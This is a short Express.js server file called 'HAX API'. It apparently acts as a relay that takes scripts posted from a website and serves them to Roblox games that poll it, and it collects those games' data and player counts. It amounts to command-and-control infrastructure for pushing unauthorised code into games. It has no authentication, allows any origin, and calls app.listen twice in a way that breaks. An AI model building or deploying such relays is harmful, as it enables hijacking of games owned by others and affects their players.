const express = require('express');
const app = express();

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.text());
app.use(express.json());

let latestScript = "";
let gamesData = [];
let globalPlayers = 0;

// Debug endpoint to check if API is working
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'online', 
        games: gamesData.length,
        players: globalPlayers,
        timestamp: Date.now()
    });
});

// Website POSTs script here
app.post('/api/execute', (req, res) => {
    latestScript = req.body;
    console.log('Script received:', latestScript ? latestScript.substring(0, 50) + '...' : 'empty');
    res.send('Script stored');
});

// Roblox GETs script from here
app.get('/api/execute', (req, res) => {
    res.send(latestScript);
    latestScript = ""; // Clear after sending
});

// Roblox POSTs game data here
app.post('/api/games/update', (req, res) => {
    try {
        console.log('Raw request body type:', typeof req.body);
        console.log('Raw request body:', req.body);
        
        let data;
        if (typeof req.body === 'string') {
            try {
                data = JSON.parse(req.body);
                console.log('Parsed JSON data:', data);
            } catch (e) {
                console.error('JSON parse error:', e);
                data = { games: [], globalPlayers: 0 };
            }
        } else {
            data = req.body;
        }
        
        gamesData = data.games || [];
        globalPlayers = data.globalPlayers || 0;
        
        console.log('Games updated:', gamesData.length, 'games,', globalPlayers, 'players');
        if (gamesData.length > 0) {
            console.log('First game:', JSON.stringify(gamesData[0]));
        }
        
        res.status(200).send('OK');
    } catch (e) {
        console.error('Error updating games:', e);
        gamesData = [];
        globalPlayers = 0;
        res.status(200).send('OK');
    }
});

// Website GETs game data here
app.get('/api/games', (req, res) => {
    console.log('Games requested, sending:', gamesData.length, 'games');
    res.json({
        total: gamesData.length,
        players: globalPlayers || 0,
        games: gamesData
    });
});

// Health check
app.get('/', (req, res) => {
    res.send('HAX API Running - ' + new Date().toISOString());
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`HAX Server running on port ${port}`);
    console.log(`API URL: https://hax-api-xdi2.onrender.com`);
});
app.listen(port, () => {
    console.log(`HAX Server running on port ${port}`);
    console.log(`API URL: http://localhost:${port}`);
});
